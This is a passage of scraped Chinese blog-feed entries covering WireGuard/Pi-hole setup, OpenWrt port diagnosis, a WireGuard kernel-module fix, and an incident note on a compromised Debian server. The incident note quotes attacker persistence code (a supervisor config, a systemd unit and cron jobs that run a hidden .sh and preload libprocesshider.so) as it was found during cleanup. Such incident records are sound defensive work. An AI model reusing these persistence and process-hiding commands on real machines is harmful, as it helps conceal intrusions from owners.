透過Cloudflare 申請全域的 Letsencrypt 憑證"},{"content":"手機上的廣告越來越討厭了\n但是用手機看頁面、影片的機會越來越高\n所以一直想看看有沒有什麼方式可以解決這個問題\n不只可以用在safari 上，連APP 裡面的廣告最好都能夠擋掉\n在github上面看到有個專案是 wireguard + pihole\n滿有趣的，就來研究一下\n我在google cloud console 申請了一台free tier 的 google compute engine (真難念，就叫VPS吧)\n免費的Google VPS 只能選擇美洲地區的機房，有點可惜，多少還是會有點影響\n作業系統選 ubuntu 20.04 minimal\n然後因為我習慣wireguard 的port 都設定在 12000\n所以要記得去開啟firewall 的 UDP 12000，然後套用在這台VPS上\n還有要設定 ssh 金鑰 這些都算是google compute engine 的基本設定，就不多說了\n系統的基本安裝完成後，接下來要用人家寫好的 script 來安裝 wireguard + pihole\n安裝基本套件 因為是選擇 ubuntu 20.04 minimal 所以有很多套件都沒有，要先安裝這些基本套件\nsudo apt update \u0026amp;\u0026amp; sudo apt install -y vim git net-tools software-properties-common iptables python3-pip qrencode 取得安裝script mkdir git \u0026amp;\u0026amp; cd git git clone https://github.com/racbart/wireguard-pihole 修改 install.sh 因為我的目的是只想要把DNS 查詢透過wireguard 丟去 pihole\n而不是把所有流量都轉給wireguard\n所以要修改一下剛剛clone 下來的 script\ncd wireguard-pihole vim install.sh 有點忘了改了哪些東西，就大概說一下吧\nIPV4_ADDRESS 原本的判斷VPS WAN IP 的指令在GCE上會抓到private ip\n所以要改一下，在 install.sh 中找到底下這行註解掉，並修改成其他指令\n#IPV4_ADDRESS=$(ip addr list \u0026#34;$INTERFACE\u0026#34; | grep \u0026#34;inet \u0026#34; | xargs | cut -d \u0026#34; \u0026#34; -f 2) IPV4_ADDRESS=$(dig +short myip.opendns.com @resolver1.opendns.com) install wireguard in ubuntu 20.04 ubuntu 20.04 安裝wireguard 的方式和 18.04 有點差別，需要多裝一個 wireguard-dkms\n找到底下這行，註解掉，改成我們要的指令，python-pip 我們用 python3-pip 取代\n在一開始就已經先裝了，所以這邊不需要再裝一次\n#apt install -y wireguard python-pip apt install -y wireguard wireguard-dkms 啟用query logging 找到底下這行，註解掉，改成啟用 query logging\n#QUERY_LOGGING=false QUERY_LOGGING=true 存檔後離開\n然後執行\nsudo ./install.sh 開始進行安裝，基本上是全自動的，應該沒有錯誤，可以順利跑完 (應該啦\u0026hellip;)\n接著來依照我自己的需求來修改一下 add-client.sh\n修改 IPV4_ADDRESS 找到底下這行註解掉，並修改成其他指令\n#IPV4_ADDRESS=$(ip addr list \u0026#34;$INTERFACE\u0026#34; | grep \u0026#34;inet \u0026#34; | xargs | cut -d \u0026#34; \u0026#34; -f 2) IPV4_ADDRESS=$(dig +short myip.opendns.com @resolver1.opendns.com) 改一下 port #SERVER_PORT=$(cat /etc/wireguard/wg0.conf | grep ListenPort | rev | cut -d \u0026#34; \u0026#34; -f 1 | rev) SERVER_PORT=12000 display client and save conf 找到底下這一段\necho \u0026#34; [Interface] PrivateKey = ${CLIENT_PRIVKEY} Address = ${NEXT_IP}/32 DNS = 10.10.0.1 [Peer] PublicKey = ${SERVER_PUBKEY} AllowedIPs = 0.0.0.0/0, ::/0 Endpoint = ${SERVER_ADDRESS}:${SERVER_PORT} \u0026#34; 改成\n# Display client config echo \u0026#34; [Interface] PrivateKey = ${CLIENT_PRIVKEY} Address = ${NEXT_IP}/32 DNS = 10.10.0.1 [Peer] PublicKey = ${SERVER_PUBKEY} #forware dns queries only,if want to forward all traffic , replace 10.10.0.1/32 to 0.0.0.0/0 AllowedIPs = 10.10.0.1/32 Endpoint = ${SERVER_ADDRESS}:${SERVER_PORT}\u0026#34;|tee ${CLIENT_NAME}.conf \u0026amp;\u0026amp; qrencode -t ansiutf8 -l L \u0026lt; ${CLIENT_NAME}.conf 之後要新增 client\n就只要輸入\nsudo bash add-client.sh \u0026#34;CLIENT_NAME\u0026#34; 就會在當前目錄底下產生 ${CLIENT_NAME}.conf 的設定檔，並顯示 qrcode\n而且也不用去管 client ip 發到哪了，script 會自己去計算\n再次強調，這只會把手機上的 dns 查詢透過wireguard指向到 pihole\n並不會把整個流量都改從wireguard 出去\n如果要改成都走wireguard 出去，那就把最後一段的 Endpoint 後面改成 0.0.0.0/0\nPC的話，wireguard 連上之後，要去手動修改DNS\n成功的話，在PC上可以看到這樣的查詢結果\npeer: mVRp+fjHKW1/n/j5Cwn9zOlLsgtHsvoiNHPSn4bHLHg= endpoint: 23.34.45.67:12000 allowed ips: 10.10.0.1/32 latest handshake: 1 hour, 48 minutes, 39 seconds ago transfer: 1.46 KiB received, 1.30 KiB sent 2020-08-13 15:42:11 [root@hqdc039 wireguard]$ dig @10.10.0.1 www.google.com.tw ; \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.16.1-Ubuntu \u0026lt;\u0026lt;\u0026gt;\u0026gt; @10.10.0.1 www.google.com.tw ; (1 server found) ;; global options: +cmd ;; Got answer: ;; -\u0026gt;\u0026gt;HEADER\u0026lt;\u0026lt;- opcode: QUERY, status: NOERROR, id: 25532 ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 1232 ;; QUESTION SECTION: ;www.google.com.tw.\tIN\tA ;; ANSWER SECTION: www.google.com.tw.\t297\tIN\tA\t64.233.177.94 ;; Query time: 399 msec ;; SERVER: 10.10.0.1#53(10.10.0.1) ;; WHEN: Thu Aug 13 15:42:24 CST 2020 ;; MSG SIZE rcvd: 79 2020-08-13 15:42:24 [root@hqdc039 wireguard]$ UPDATE 更新一下開啟 pihole DOT (DNS Over TLS) 的方式\n安裝並建立相關目錄 sudo apt update sudo apt install stubby sudo mkdir /var/cache/stubby 修改 /etc/stubby/stubby.yml 編輯 /etc/stubby/stubby.yml 改成以下內容\nresolution_type: GETDNS_RESOLUTION_STUB dns_transport_list: - GETDNS_TRANSPORT_TLS tls_authentication: GETDNS_AUTHENTICATION_REQUIRED tls_query_padding_blocksize: 128 edns_client_subnet_private : 1 round_robin_upstreams: 1 idle_timeout: 10000 tls_connection_retries: 5 xtls_ca_path: \u0026#34;/etc/ssl/certs/\u0026#34; ################################ LISTEN ADDRESS ################################ # Set the listen addresses for the stubby DAEMON. This specifies localhost IPv4 # and IPv6. It will listen on port 53 by default. Use \u0026lt;IP_address\u0026gt;@\u0026lt;port\u0026gt; to # specify a different port listen_addresses: - 127.0.0.1@5453 appdata_dir: \u0026#34;/var/cache/stubby\u0026#34; upstream_recursive_servers: - address_data: 145.100.185.15 tls_auth_name: \u0026#34;dnsovertls.sinodun.com\u0026#34; - address_data: 1.1.1.1 tls_auth_name: \u0026#34;cloudflare-dns.com\u0026#34; ## Quad 9 \u0026#39;secure\u0026#39; service - Filters, does DNSSEC, doesn\u0026#39;t send ECS # - address_data: 9.9.9.9 # tls_auth_name: \u0026#34;dns.quad9.net\u0026#34; ## Quad 9 \u0026#39;insecure\u0026#39; service - No filtering, does DNSSEC, may send ECS (it is ## unclear if it honours the edns_client_subnet_private request from stubby) # - address_data: 9.9.9.10 # tls_auth_name: \u0026#34;dns.quad9.net\u0026#34; ## Cloudflare 1.1.1.1 and 1.0.0.1 # - address_data: 1.1.1.1 # tls_auth_name: \u0026#34;cloudflare-dns.com\u0026#34; # - address_data: 1.0.0.1 # tls_auth_name: \u0026#34;cloudflare-dns.com\u0026#34; ## The Uncensored DNS servers # - address_data: 89.233.43.71 # tls_auth_name: \u0026#34;unicast.censurfridns.dk\u0026#34; # tls_pubkey_pinset: # - digest: \u0026#34;sha256\u0026#34; # value: wikE3jYAA6jQmXYTr/rbHeEPmC78dQwZbQp6WdrseEs= ## Fondation RESTENA (NREN for Luxembourg) # - address_data: 158.64.1.29 # tls_auth_name: \u0026#34;kaitain.restena.lu\u0026#34; # tls_pubkey_pinset: # - digest: \u0026#34;sha256\u0026#34; # value: 7ftvIkA+UeN/ktVkovd/7rPZ6mbkhVI7/8HnFJIiLa4= ## Google # - address_data: 8.8.8.8 # tls_auth_name: \u0026#34;dns.google\u0026#34; # - address_data: 8.8.4.4 # tls_auth_name: \u0026#34;dns.google\u0026#34; 重啟 stubby service\nsudo service tubby restart 修改pihole 相關設定 開啟 pihole web 管理界面 settings -\u0026gt; dns -\u0026gt; 左邊預設的DNS 都不要選，在右邊的 custom 1(IPV4) 填入\n存檔後離開\n127.0.0.1#5453 ","date":"2020-08-13T14:22:05+08:00","image":"https://h.cowbay.org/images/post-default-16.jpg","permalink":"https://h.cowbay.org/post/wireguard-pihole-in-ubuntu-20.04/","title":"[筆記] 在 ubuntu 20.04 上安裝 wireguard + pihole 作 AD Blocking/install wireguard and pihole to do ad block in ubuntu 20.04 "},{"content":"最近在玩ansible + openwrt + wireguard\nansible 腳本寫好之後，可以把config 佈署到 openwrt 上\n當然前提是最好用同樣的機器，不同的機器在config 上會有一些差異\n但是這些差異常常就會造成無法連線、無法使用的狀況\nBTW 我是用 ubiquiti 的 edgerouter X 來做\n都弄好之後，就想說來跑個iperf3 測試一下連線速度\n也好和之前做的 IPSEC 比較一下\n結果很奇怪的是，明明一樣的機器、一樣用ansible 跑出來的config\n但是有一台edgerouter X 的VPN 連接速度就是特別慢\n而且速度都剛好卡在 99.X Mb 左右\n就讓我很納悶了\u0026hellip;\n於是想說來檢查一下網路孔的狀態\n但是因為openwrt 精簡了很多指令，所以一些linux 上常用的指令都看不到實際的連線速度\n後來終於找到這一篇\nhttps://forum.openwrt.org/t/change-interface-br-lan-from-100-mb-to-1-gigabit-help-me/21914\n其中有提到這個指令\nswconfig dev switch0 show 所以在有問題的那台機器跑一次，結果就發現了port0 的連線速度只有100BaseT\nroot@OpenWrt-15:~# swconfig dev switch0 show Global attributes: enable_vlan: 1 mib: Switch MIB counters PPE_AC_BCNT0: 0 PPE_AC_PCNT0: 0 PPE_AC_BCNT63: 0 PPE_AC_PCNT63: 0 PPE_MTR_CNT0: 0 PPE_MTR_CNT63: 0 GDM1_TX_GBCNT: 0 GDM1_TX_GPCNT: 0 GDM1_TX_SKIPCNT: 0 GDM1_TX_COLCNT: 0 GDM1_RX_GBCNT1: 0 GDM1_RX_GPCNT1: 0 GDM1_RX_OERCNT: 0 GDM1_RX_FERCNT: 0 GDM1_RX_SERCNT: 0 GDM1_RX_LERCNT: 0 GDM1_RX_CERCNT: 0 GDM1_RX_FCCNT: 0 GDM2_TX_GBCNT: 0 GDM2_TX_GPCNT: 0 GDM2_TX_SKIPCNT: 0 GDM2_TX_COLCNT: 0 GDM2_RX_GBCNT: 0 GDM2_RX_GPCNT: 0 GDM2_RX_OERCNT: 0 GDM2_RX_FERCNT: 0 GDM2_RX_SERCNT: 0 GDM2_RX_LERCNT: 0 GDM2_RX_CERCNT: 0 GDM2_RX_FCCNT: 0 Port 0: mib: Port 0 MIB counters TxDrop : 0 TxCRC : 0 TxUni : 6861716 TxMulti : 8 TxBroad : 12 TxCollision: 0 TxSingleCol: 0 TxMultiCol : 0 TxDefer : 0 TxLateCol : 0 TxExcCol : 0 TxPause : 0 Tx64Byte : 4056 Tx65Byte : 11645 Tx128Byte : 13210 Tx256Byte : 249 Tx512Byte : 169 Tx1024Byte : 6832407 TxByte : 10238376166 RxDrop : 0 RxFiltered : 49 RxUni : 963037 RxMulti : 1200795 RxBroad : 54114 RxAlignErr : 0 RxCRC : 0 RxUnderSize: 0 RxFragment : 0 RxOverSize : 0 RxJabber : 0 RxPause : 0 Rx64Byte : 56679 Rx65Byte : 117104 Rx128Byte : 1359908 Rx256Byte : 181766 Rx512Byte : 198823 Rx1024Byte : 303666 RxByte : 889985596 RxCtrlDrop : 0 RxIngDrop : 0 RxARLDrop : 0 pvid: 2 link: port:0 link:up speed:100baseT full-duplex Port 1: mib: Port 1 MIB counters TxDrop : 0 TxCRC : 0 TxUni : 948176 TxMulti : 170 TxBroad : 3 TxCollision: 0 TxSingleCol: 0 TxMultiCol : 0 TxDefer : 0 TxLateCol : 0 TxExcCol : 0 TxPause : 0 Tx64Byte : 1557 Tx65Byte : 930766 Tx128Byte : 1302 Tx256Byte : 528 Tx512Byte : 75 Tx1024Byte : 14121 TxByte : 87870052 RxDrop : 0 RxFiltered : 0 RxUni : 6849258 RxMulti : 187 RxBroad : 0 RxAlignErr : 0 RxCRC : 0 RxUnderSize: 0 RxFragment : 0 RxOverSize : 0 RxJabber : 0 RxPause : 0 Rx64Byte : 911 Rx65Byte : 14343 Rx128Byte : 298 Rx256Byte : 88 Rx512Byte : 56 Rx1024Byte : 6833749 RxByte : 9828214886 RxCtrlDrop : 0 RxIngDrop : 0 RxARLDrop : 0 pvid: 1 link: port:1 link:up speed:1000baseT full-duplex Port 2: mib: Port 2 MIB counters TxDrop : 0 TxCRC : 0 TxUni : 0 TxMulti : 0 TxBroad : 0 TxCollision: 0 TxSingleCol: 0 TxMultiCol : 0 TxDefer : 0 TxLateCol : 0 TxExcCol : 0 TxPause : 0 Tx64Byte : 0 Tx65Byte : 0 Tx128Byte : 0 Tx256Byte : 0 Tx512Byte : 0 Tx1024Byte : 0 TxByte : 0 RxDrop : 0 RxFiltered : 0 RxUni : 0 RxMulti : 0 RxBroad : 0 RxAlignErr : 0 RxCRC : 0 RxUnderSize: 0 RxFragment : 0 RxOverSize : 0 RxJabber : 0 RxPause : 0 Rx64Byte : 0 Rx65Byte : 0 Rx128Byte : 0 Rx256Byte : 0 Rx512Byte : 0 Rx1024Byte : 0 RxByte : 0 RxCtrlDrop : 0 RxIngDrop : 0 RxARLDrop : 0 pvid: 1 link: port:2 link:down Port 3: mib: Port 3 MIB counters TxDrop : 0 TxCRC : 0 TxUni : 0 TxMulti : 0 TxBroad : 0 TxCollision: 0 TxSingleCol: 0 TxMultiCol : 0 TxDefer : 0 TxLateCol : 0 TxExcCol : 0 TxPause : 0 Tx64Byte : 0 Tx65Byte : 0 Tx128Byte : 0 Tx256Byte : 0 Tx512Byte : 0 Tx1024Byte : 0 TxByte : 0 RxDrop : 0 RxFiltered : 0 RxUni : 0 RxMulti : 0 RxBroad : 0 RxAlignErr : 0 RxCRC : 0 RxUnderSize: 0 RxFragment : 0 RxOverSize : 0 RxJabber : 0 RxPause : 0 Rx64Byte : 0 Rx65Byte : 0 Rx128Byte : 0 Rx256Byte : 0 Rx512Byte : 0 Rx1024Byte : 0 RxByte : 0 RxCtrlDrop : 0 RxIngDrop : 0 RxARLDrop : 0 pvid: 1 link: port:3 link:down Port 4: mib: Port 4 MIB counters TxDrop : 0 TxCRC : 0 TxUni : 0 TxMulti : 0 TxBroad : 0 TxCollision: 0 TxSingleCol: 0 TxMultiCol : 0 TxDefer : 0 TxLateCol : 0 TxExcCol : 0 TxPause : 0 Tx64Byte : 0 Tx65Byte : 0 Tx128Byte : 0 Tx256Byte : 0 Tx512Byte : 0 Tx1024Byte : 0 TxByte : 0 RxDrop : 0 RxFiltered : 0 RxUni : 0 RxMulti : 0 RxBroad : 0 RxAlignErr : 0 RxCRC : 0 RxUnderSize: 0 RxFragment : 0 RxOverSize : 0 RxJabber : 0 RxPause : 0 Rx64Byte : 0 Rx65Byte : 0 Rx128Byte : 0 Rx256Byte : 0 Rx512Byte : 0 Rx1024Byte : 0 RxByte : 0 RxCtrlDrop : 0 RxIngDrop : 0 RxARLDrop : 0 pvid: 1 link: port:4 link:down Port 5: mib: Port 5 MIB counters TxDrop : 0 TxCRC : 0 TxUni : 0 TxMulti : 0 TxBroad : 0 TxCollision: 0 TxSingleCol: 0 TxMultiCol : 0 TxDefer : 0 TxLateCol : 0 TxExcCol : 0 TxPause : 0 Tx64Byte : 0 Tx65Byte : 0 Tx128Byte : 0 Tx256Byte : 0 Tx512Byte : 0 Tx1024Byte : 0 TxByte : 0 RxDrop : 0 RxFiltered : 0 RxUni : 0 RxMulti : 0 RxBroad : 0 RxAlignErr : 0 RxCRC : 0 RxUnderSize: 0 RxFragment : 0 RxOverSize : 0 RxJabber : 0 RxPause : 0 Rx64Byte : 0 Rx65Byte : 0 Rx128Byte : 0 Rx256Byte : 0 Rx512Byte : 0 Rx1024Byte : 0 RxByte : 0 RxCtrlDrop : 0 RxIngDrop : 0 RxARLDrop : 0 pvid: 0 link: port:5 link:down Port 6: mib: Port 6 MIB counters TxDrop : 0 TxCRC : 0 TxUni : 7812303 TxMulti : 1200937 TxBroad : 54112 TxCollision: 0 TxSingleCol: 0 TxMultiCol : 0 TxDefer : 0 TxLateCol : 0 TxExcCol : 0 TxPause : 13632 Tx64Byte : 13632 Tx65Byte : 188400 Tx128Byte : 1360750 Tx256Byte : 181926 Tx512Byte : 198875 Tx1024Byte : 7137402 TxByte : 10755312044 RxDrop : 0 RxFiltered : 51 RxUni : 7809918 RxMulti : 201 RxBroad : 30 RxAlignErr : 0 RxCRC : 0 RxUnderSize: 0 RxFragment : 0 RxOverSize : 0 RxJabber : 0 RxPause : 89 Rx64Byte : 5720 Rx65Byte : 942425 Rx128Byte : 14535 Rx256Byte : 778 Rx512Byte : 249 Rx1024Byte : 6846531 RxByte : 10357481140 RxCtrlDrop : 0 RxIngDrop : 0 RxARLDrop : 0 pvid: 0 link: port:6 link:up speed:1000baseT full-duplex Port 7: mib: Port 7 MIB counters TxDrop : 0 TxCRC : 0 TxUni : 0 TxMulti : 0 TxBroad : 0 TxCollision: 0 TxSingleCol: 0 TxMultiCol : 0 TxDefer : 0 TxLateCol : 0 TxExcCol : 0 TxPause : 0 Tx64Byte : 0 Tx65Byte : 0 Tx128Byte : 0 Tx256Byte : 0 Tx512Byte : 0 Tx1024Byte : 0 TxByte : 0 RxDrop : 0 RxFiltered : 0 RxUni : 0 RxMulti : 0 RxBroad : 0 RxAlignErr : 0 RxCRC : 0 RxUnderSize: 0 RxFragment : 0 RxOverSize : 0 RxJabber : 0 RxPause : 0 Rx64Byte : 0 Rx65Byte : 0 Rx128Byte : 0 Rx256Byte : 0 Rx512Byte : 0 Rx1024Byte : 0 RxByte : 0 RxCtrlDrop : 0 RxIngDrop : 0 RxARLDrop : 0 pvid: 0 link: port:7 link:down VLAN 1: vid: 1 ports: 1 2 3 4 6t VLAN 2: vid: 2 ports: 0 6t WTF !?\n既然另外幾台都沒有問題，那麼應該就是這台機器的網路孔、或者網路線有問題了！\n那就換換看網路線吧！\n果然從原本的 CAT 5E 換成 CAT 6 之後，連線速率就變成 1000 Mb了\n但是CAT 5E 應該要能支援到1000Mb 才對啊！\n所以就是這條 CAT 5E 要不就是偷工減料，要不就是年紀到了，衰退了？？\n以後還是不要用 CAT 5E 的線了\u0026hellip;\n這邊太多的古董，總是藏著一些奇奇怪怪的臭蟲 \u0026hellip;.\n同場加映一下 wireguard 連線的速率\n大概都能跑到200 Mb 左右\n比起原本strongswan 打的 IPSEC 只有 30 Mb 左右 ，那是進步太多太多了！\nstrongswan 的設定又囉唆，該是讓他退場的時候了！\n","date":"2020-07-15T10:35:01+08:00","image":"https://h.cowbay.org/images/post-default-10.jpg","permalink":"https://h.cowbay.org/post/check-port-speed-in-openwrt/","title":"[筆記] 在openwrt 中檢查網路埠的連接速度/ Check Port Speed in Openwrt"},{"content":"上禮拜某天在開會的時候，LINE不斷傳來訊息\n不過因為我向來開會都很認真(驕傲，所以都沒看，接著就變成來電了\n看來大概有啥事發生\n不過畢竟不是正職的工作，就先放著吧\n後來變成連學長都直接打來告訴我，某間公司的伺服器出事了，客戶找不到我\n叫我趕快連進去看\n是說，啊我又沒跟人家簽維護，趕什麼趕\u0026hellip;\n總之，開完會後就了解一下狀況\n了解狀況後(user 也只說不能連線..WTF)，還是直接連進去看伺服器啥問題好了\n連線的過程就發現，主機回應有點慢\n不過還是可以連上，檢查一下ps / netstat 等等訊息，感覺就是有哪裡怪怪的\n進去etc 看一下，一下 ls -lart 就發現不對，畫面整個跑掉\n感覺就多了很多檔案\n所以先裝個file manager 來看(這樣才能避免ls 被駭客調包的情況)\n總之就發現了一些不正常的檔案\n/etc/.sh 等等族繁不及備載\n於是先去FW 把這台機器對外開放的port 先關掉\n然後開始紀錄邊清\n底下是一些記錄下來的log 很亂，因為是邊清邊紀錄的關係\n這是在某個特定日期時間被產生出來的檔案\n/etc/allow.bak /etc/deny.bak /etc/fstab /etc/sysctl.conf /etc/gshadow /etc/fstab.bak /etc/subuid /etc/subgid /etc/.supervisor /sbin/https /swapfile /var/mail/root /var/lib/rkhunter/tmp/group /var/lib/rkhunter/tmp/passwd /var/lib/dpkg/info/python-meld3.list /var/backups/dpkg.status.1.gz /var/backups/shadow.bak /var/backups/group.bak /var/backups/dpkg.status.6.gz /var/backups/dpkg.status.3.gz /var/backups/dpkg.status.5.gz /var/backups/apt.extended_states.0 /var/backups/dpkg.status.2.gz /var/backups/passwd.bak /var/backups/gshadow.bak /var/backups/dpkg.status.0 /var/backups/dpkg.status.4.gz /var/log/wtmp.1 /var/log/supervisor /var/log/dpkg.log.1 /var/log/secure /var/log/apt/term.log.1.gz /var/log/apt/history.log.1.gz /usr/lib/systemd /usr/lib/mysql/mysql /etc/.supervisor/conf.d/sh.conf\n[program:.sh] directory=/etc/ command=/bin/bash -c \u0026#39;cp -f -r -- /etc/spts /bin/.sh 2\u0026gt;/dev/null \u0026amp;\u0026amp; /bin/.sh -c \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; rm -rf -- /bin/.sh 2\u0026gt;/dev/null\u0026#39; autostart=true autorestart=true startretries=999999999 redirect_stderr=true pidfile=/etc/psdewo.pid stdout_logfile=/etc/usercenter_stdout php.sh 這個忘了是在crontab 還是/etc/profile.d/底下看到的\n#!/bin/bash cp -f -r -- /bin/shh /bin/.sh 2\u0026gt;/dev/null /bin/.sh -c \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 rm -rf -- .sh 2\u0026gt;/dev/null supervisor.sh\n#!/bin/bash supervisord -c /etc/.supervisor/supervisord.conf \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 supervisorctl reload \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 某個 service 檔案\n[Unit] Description=.sh Wants=network.target After=syslog.target network-online.target [Service] Type=forking ExecStart=/bin/bash -c \u0026#39;cp -f -r -- /bin/.funzip /bin/.sh 2\u0026gt;/dev/null \u0026amp;\u0026amp; /bin/.sh -c \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; rm -rf -- /bin/.sh 2\u0026gt;/dev/null\u0026#39; Restart=always KillMode=process [Install] WantedBy=multi-user.target syslog 部份內容\nJul 7 06:20:01 pve CRON[12502]: (root) CMD (/sbin/httpss) Jul 7 06:20:01 pve CRON[12499]: (root) CMD ( echo /usr/local/lib/libprocesshider.so \u0026gt; /etc/ld.so.preload \u0026amp;\u0026amp; lockr +i /etc/ld.so.preload \u0026gt;/dev/null 2\u0026gt;\u0026amp;1) Jul 7 06:21:01 pve CRON[14096]: (root) CMD (/usr/lib/mysql/mysql) Jul 7 06:21:01 pve CRON[14095]: (root) CMD ( echo /usr/local/lib/libprocesshider.so \u0026gt; /etc/ld.so.preload \u0026amp;\u0026amp; lockr +i /etc/ld.so.preload \u0026gt;/dev/null 2\u0026gt;\u0026amp;1) Jul 7 06:21:01 pve CRON[14094]: (root) CMD ( cp -f -r -- /etc/.sh /tmp/.sh 2\u0026gt;/dev/null \u0026amp;\u0026amp; /tmp/.sh -c \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; rm -rf -- /tmp/.sh 2\u0026gt;/dev/null) Jul 7 06:22:01 pve CRON[15995]: (root) CMD ( echo /usr/local/lib/libprocesshider.so \u0026gt; /etc/ld.so.preload \u0026amp;\u0026amp; lockr +i /etc/ld.so.preload \u0026gt;/dev/null 2\u0026gt;\u0026amp;1) Jul 7 06:22:01 pve CRON[15994]: (root) CMD ( cp -f -r -- /etc/.sh /tmp/.sh 2\u0026gt;/dev/null \u0026amp;\u0026amp; /tmp/.sh -c \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; rm -rf -- /tmp/.sh 2\u0026gt;/dev/null) Jul 7 06:22:01 pve CRON[15996]: (root) CMD (/usr/lib/mysql/mysql) Jul 7 06:23:01 pve CRON[17708]: (root) CMD ( echo /usr/local/lib/libprocesshider.so \u0026gt; /etc/ld.so.preload \u0026amp;\u0026amp; lockr +i /etc/ld.so.preload \u0026gt;/dev/null 2\u0026gt;\u0026amp;1) Jul 7 06:23:01 pve CRON[17709]: (root) CMD ( cp -f -r -- /etc/.sh /tmp/.sh 2\u0026gt;/dev/null \u0026amp;\u0026amp; /tmp/.sh -c \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; rm -rf -- /tmp/.sh 2\u0026gt;/dev/null) Jul 7 06:23:01 pve CRON[17710]: (root) CMD (/usr/lib/mysql/mysql) Jul 7 06:24:01 pve CRON[19353]: (root) CMD ( cp -f -r -- /etc/.sh /tmp/.sh 2\u0026gt;/dev/null \u0026amp;\u0026amp; /tmp/.sh -c \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; rm -rf -- /tmp/.sh 2\u0026gt;/dev/null) Jul 7 06:24:01 pve CRON[19351]: (root) CMD ( echo /usr/local/lib/libprocesshider.so \u0026gt; /etc/ld.so.preload \u0026amp;\u0026amp; lockr +i /etc/ld.so.preload \u0026gt;/dev/null 2\u0026gt;\u0026amp;1) Jul 7 06:24:01 pve CRON[19352]: (root) CMD (/usr/lib/mysql/mysql) Jul 7 06:25:01 pve CRON[21289]: (root) CMD ( cp -f -r -- /etc/.sh /tmp/.sh 2\u0026gt;/dev/null \u0026amp;\u0026amp; /tmp/.sh -c \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 \u0026amp;\u0026amp; rm -rf -- /tmp/.sh 2\u0026gt;/dev/null) Jul 7 06:25:01 pve CRON[21290]: (root) CMD (/usr/lib/mysql/mysql) Jul 7 06:25:01 pve CRON[21288]: (root) CMD (test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily )) Jul 7 06:25:01 pve CRON[21291]: (root) CMD ( echo /usr/local/lib/libprocesshider.so \u0026gt; /etc/ld.so.preload \u0026amp;\u0026amp; lockr +i /etc/ld.so.preload \u0026gt;/dev/null 2\u0026gt;\u0026amp;1) 比較特別的是，他會去修改 /etc/fstab 載入一個 swapfile\nWTF！？ 沒事載入自己的 fstab 做啥？？\n然後還會在系統建立user 可以看一下 /etc/passwd , /etc/group , /etc/gshadow 這些檔案檢查\n手邊最好有另一臺乾淨的同樣作業系統的機器\n因為有很多系統指令已經被替換掉(netstat/ss/lsof 等等)\n需要從乾淨的系統弄過來，或者是重新從apt 安裝回來\n","date":"2020-07-10T09:48:24+08:00","image":"https://h.cowbay.org/images/post-default-14.jpg","permalink":"https://h.cowbay.org/post/debian-buster-server-been-hacked/","title":"[筆記] Debian Buster 伺服器被入侵了！/ Debian Buster Server Been Hacked"},{"content":"工作用的電腦，昨天終於難得的reboot了(uptime 看了一下，大概是三百多天)\n結果重開機之後，發現原本在打tunnel 連 ptt 的 wireguard VPN 掛掉了\n手動下指令也啟動不了\n查了一下發現是 ubuntu 18.04 kernel 4.15.0-106 的包\n看來就連kernel 最好都不要自動升級\u0026hellip;\n一開始不管怎麼下指令要啟動wireguard Interface 都會出錯\nroot@hqdc034:~# wg-quick up wg0 [#] ip link add wg0 type wireguard RTNETLINK answers: Operation not supported Unable to access interface: Protocol not supported [#] ip link delete dev wg0 Cannot find device \u0026#34;wg0\u0026#34; root@hqdc034:~# wg-quick up wg1 [#] ip link add wg1 type wireguard RTNETLINK answers: Operation not supported Unable to access interface: Protocol not supported [#] ip link delete dev wg1 Cannot find device \u0026#34;wg1\u0026#34; 因為很久沒動了，所以wireguard config 檔案應該是沒有問題\n不過還是檢查看看？\nroot@hqdc034:~# wg showconf wg0 Unable to access interface: Protocol not supported 很好，果然不是config 的問題，看來是wireguard 某些套件有狀況了\n用modprobe 檢查一下\nroot@hqdc034:~# modprobe wireguard modprobe: FATAL: Module wireguard not found in directory /lib/modules/4.15.0-106-generic OK ，找到問題了，看起來是新版本的kernel 有某些狀況？\nanyway\n要解決其實很簡單，要不就直接上 20.04 XD\n要不就重裝 wireguard-dkms (這個似乎是新釋出的套件，本來沒有這個的)\nroot@hqdc034:~# apt-get install wireguard-dkms wireguard-tools linux-headers-$(uname -r) 正在讀取套件清單... 完成 正在重建相依關係 正在讀取狀態資料... 完成 linux-headers-4.15.0-106-generic 已是最新版本 (4.15.0-106.107)。 linux-headers-4.15.0-106-generic 被設定為手動安裝。 wireguard-tools 已是最新版本 (1.0.20200513-1~18.04)。 wireguard-tools 被設定為手動安裝。 以下套件為自動安裝，並且已經無用： dmeventd liblvm2app2.2 liblvm2cmd2.02 libopts25 libreadline5 python-egenix-mxdatetime python-egenix-mxtools python-psutil python-psycopg2 python3-flask-htmlmin python3-htmlmin sntp 使用 \u0026#39;apt autoremove\u0026#39; 將之移除。 下列套件將會被升級： wireguard-dkms 升級 1 個，新安裝 0 個，移除 0 個，有 123 個未被升級。 需要下載 254 kB 的套件檔。 此操作完成之後，會多佔用 1,024 B 的磁碟空間。 是否繼續進行 [Y/n]？ [Y/n] y 下載:1 http://ppa.launchpad.net/wireguard/wireguard/ubuntu bionic/main amd64 wireguard-dkms all 1.0.20200611-0ppa1~18.04 [254 kB] 取得 254 kB 用了 1秒 (184 kB/s) （讀取資料庫 ... 目前共安裝了 298316 個檔案和目錄。） 準備解開 .../wireguard-dkms_1.0.20200611-0ppa1~18.04_all.deb ... -------- Uninstall Beginning -------- Module: wireguard Version: 1.0.20200426 Kernel: 4.15.0-101-generic (x86_64) ------------------------------------- Status: Before uninstall, this module version was ACTIVE on this kernel. wireguard.ko: - 